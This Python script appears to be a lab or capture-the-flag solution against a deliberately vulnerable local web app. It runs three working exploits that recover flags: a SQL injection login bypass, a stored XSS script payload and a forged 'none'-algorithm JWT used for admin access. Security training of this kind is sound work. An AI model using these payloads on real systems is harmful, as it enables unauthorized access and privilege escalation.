import requests
import json
import base64
import hashlib
import time

BASE_URL = 'http://localhost:5001'

def exploit_sql_injection():
    print("\n1. SQL Injection Exploit (Authentication Bypass)")
    print("----------------------------------------------")
    # SQL Injection payload
    payload = {
        'username': "admin' --",
        'password': 'anything'
    }
    
    r = requests.post(f'{BASE_URL}/login', data=payload)
    if 'FLAG{SQL_M4st3r_Byp4ss_2025}' in r.text:
        print("✓ SQL Injection successful!")
        print("Flag found:", 'FLAG{SQL_M4st3r_Byp4ss_2025}')
    else:
        print("× SQL Injection failed")
        print("Response:", r.text[:200])  # Show first 200 chars of response

def exploit_stored_xss():
    print("\n2. Stored XSS Exploit (Cross-Site Scripting)")
    print("-------------------------------------------")
    
    # First register a new user
    username = f"attacker_{int(time.time())}"
    password = "test123"
    
    r = requests.post(f'{BASE_URL}/register', data={
        'username': username,
        'password': password
    })
    
    # Login
    r = requests.post(f'{BASE_URL}/login', data={
        'username': username,
        'password': password
    })
    cookies = r.cookies
    
    # Create post with XSS payload
    xss_payload = '<script>alert(document.getElementById("xss-flag").innerText)</script>'
    params = {
        'action': 'post',
        'title': 'XSS Test',
        'content': xss_payload
    }
    
    r = requests.get(f'{BASE_URL}/dashboard', params=params, cookies=cookies)
    if 'FLAG{XSS_St0r3d_Att4ck_2025}' in r.text:
        print("✓ XSS payload injected successfully!")
        print("Flag found:", 'FLAG{XSS_St0r3d_Att4ck_2025}')
    else:
        print("× XSS injection failed")

def exploit_jwt_none():
    print("\n3. JWT None Algorithm Exploit (Privilege Escalation)")
    print("------------------------------------------------")
    
    # Create a forged JWT token with 'none' algorithm
    header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode()
    payload = base64.b64encode(json.dumps({"username": "admin", "role": "admin"}).encode()).decode()
    forged_token = f"{header}.{payload}."  # No signature needed
    
    # Try to access admin API
    headers = {'Authorization': f'Bearer {forged_token}'}
    r = requests.get(f'{BASE_URL}/api/secret', headers=headers)
    
    if 'FLAG{JWT_N0n3_Alg_Tr1ck_2025}' in r.text:
        print("✓ JWT None algorithm exploit successful!")
        print("Flag found:", 'FLAG{JWT_N0n3_Alg_Tr1ck_2025}')
    else:
        print("× JWT exploit failed")

if __name__ == "__main__":
    print("AWAS Project - Core Vulnerability Exploitation Demo")
    print("===============================================")
    print("This script demonstrates the three main vulnerabilities:")
    print("1. SQL Injection - Authentication Bypass")
    print("2. Stored XSS - Cross-Site Scripting Attack")
    print("3. JWT None Algorithm - Privilege Escalation")
    print("\nStarting exploitation...\n")
    try:
        exploit_sql_injection()
        exploit_stored_xss()
        exploit_jwt_none()
        
        print("\nAll exploits completed!")
        print("Try them manually in the browser for better understanding.")
        print("Remember to look for the hidden flags in the page source when successful.")
        
    except Exception as e:
        print(f"\nError during exploitation: {str(e)}")
        print("Make sure the application is running at", BASE_URL)